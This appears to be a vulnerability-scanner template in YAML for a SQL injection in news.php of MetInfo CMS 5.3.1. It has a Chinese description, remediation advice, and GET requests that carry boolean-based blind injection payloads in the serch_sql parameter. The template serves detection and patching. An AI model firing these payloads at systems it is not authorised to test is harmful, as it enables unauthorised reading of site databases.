id: Metinfo-V5_3_1_news_php-SQLi
info:
  name: MetInfo V5.3.1 news.php sql注入
  author:
  - l0ne1y
  description: |-
    MetInfo CMS V5.3.1 news.php页面sql注入漏洞
    MetInfo是一款适合企业建站的开源免费CMS建站系统，MetInfo企业网站管理系统主要用于搭建企业网站，采用PHP+Mysql架构。

    MetInfo V5.3.1版本中news.php页面存在SQL注入漏洞，攻击者可利用此漏洞来获取敏感信息。
  reference:
  - http://www.wooyun.org/bugs/wooyun-2015-0119166
  severity: critical
  remediation: |-
    修复建议
    官方修复方案：
    1、升级系统至无漏洞版本，或于官网下载安全补丁
    https://www.mituo.cn/
    临时修复方案：
    1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。
    2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。
    3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。
    4、数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。
    5、网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。
    6、严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。
    7、避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。
    8、过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。
requests:
- matchers:
  - type: dsl
    dsl:
    - 'status_code_2==200 && status_code_3==200 '
  - type: regex
    regex:
    - <h2><a href=[\'"]?[./a-zA-Z0-9_-]*shownews.php\?"
  extractors:
  - name: news
    type: regex
    regex:
    - (/news.php\?[a-zA-Z0-9&=]*class[\d]+=[\d]+)[\"]
    group: 1
    part: body
    internal: true
  matchers-condition: and
  path:
  - '{{BaseURL}}/news/'
  - '{{BaseURL}}/news{{news}}&serch_sql=as%20a%20join%20information_schema.CHARACTER_SETS%20as%20b%20where%20if(ascii(substr(b.CHARACTER_SET_NAME,1,1))>0,1,0)%20limit%201--%20sd&imgproduct=xxxx'
  - '{{BaseURL}}/news{{news}}&serch_sql=as%20a%20join%20information_schema.CHARACTER_SETS%20as%20b%20where%20if(ascii(substr(b.CHARACTER_SET_NAME,1,1))>255,1,0)%20limit%201--%20sd&imgproduct=xxxx'
  method: GET
